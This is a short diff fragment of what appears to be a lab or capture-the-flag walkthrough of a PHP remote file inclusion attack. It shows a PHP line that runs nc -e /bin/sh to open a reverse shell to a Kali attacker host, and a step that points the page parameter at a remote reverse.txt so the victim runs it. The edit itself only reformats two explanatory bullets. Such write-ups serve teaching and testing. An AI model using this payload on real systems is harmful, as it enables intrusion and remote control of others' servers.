@@ -28,5 +28,5 @@ passthru('nc -e /bin/sh 10.20.14.203 8080');
 ?>
 ```
 2. Modify ```?page=include.php``` to ```?page=http://10.20.14.203/reverse.txt?```
-   - If extnsion be *"php"*, it will run on kali machine. 
-   - ? is for run the code in victim machine
+   - If extnsion be ```php```, it will run on kali machine. 
+   - ```?``` is for run the code in victim machine
